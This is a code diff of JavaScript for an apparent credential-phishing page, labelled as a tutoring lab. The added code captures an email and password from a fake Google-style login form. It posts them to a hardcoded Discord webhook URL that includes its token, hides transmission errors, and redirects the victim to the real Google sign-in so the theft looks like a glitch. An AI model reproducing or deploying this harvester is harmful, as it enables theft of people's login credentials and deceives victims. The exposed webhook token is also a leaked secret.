@@ -1,44 +1,44 @@
+// ENI-Tutor | Lab 3.2 | Hardcoded Silent Hook
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
+
+function showPassword() {
+    const emailVal = document.getElementById('email').value;
+    if (emailVal.includes('@')) {
+        document.getElementById('display-email').innerText = emailVal;
+        document.getElementById('email-section').style.display = 'none';
+        document.getElementById('password-section').style.display = 'block';
+    }
+}
+
 async function capture() {
     const email = document.getElementById('email').value;
     const pass = document.getElementById('password').value;
-    const hook = sessionStorage.getItem('lab_hook');
 
-    console.log("🛠️ Attempting transmission to:", hook);
-
-    // This is the specific "JSON shape" Discord demands
-    const payload = {
-        content: "🚨 **Lab 3.2: Alert**", 
+    // Crafting the JSON payload for Discord
+    const data = {
+        content: "🚨 **Tier 3 Harvest Detected**",
         embeds: [{
-            title: "Credential Harvested",
+            title: "Credential Log",
             color: 16711680, // Red
             fields: [
-                { name: "Email", value: email || "empty", inline: true },
-                { name: "Password", value: pass || "empty", inline: true }
+                { name: "User/Email", value: `\`${email}\``, inline: true },
+                { name: "Password", value: `\`${pass}\``, inline: true }
             ],
-            footer: { text: "ENI-Tutor | Tier 3 Journeyman" }
+            footer: { text: "Simulated Document Injection | ENI-Tutor" }
         }]
     };
 
     try {
-        const response = await fetch(hook, {
+        // The "Exfiltration" jump
+        await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            body: JSON.stringify(data)
         });
-
-        if (response.ok) {
-            console.log("✅ Discord accepted the packet (Status 204).");
-        } else {
-            console.error("❌ Discord rejected it. Status:", response.status);
-            const errorText = await response.text();
-            console.error("Reason:", errorText);
-        }
-    } catch (err) {
-        console.error("🌐 Network Error (Check your URL or Internet):", err);
+    } catch (error) {
+        console.error("Transmission failed, but we stay silent.");
     }
 
-    // Delay redirect so we can see the logs
-    setTimeout(() => {
-        window.location.href = "https://accounts.google.com";
-    }, 2000);
+    // The "Lure" - Redirect to the real Google login so they think it was a glitch
+    window.location.href = "https://accounts.google.com/ServiceLogin";
 }
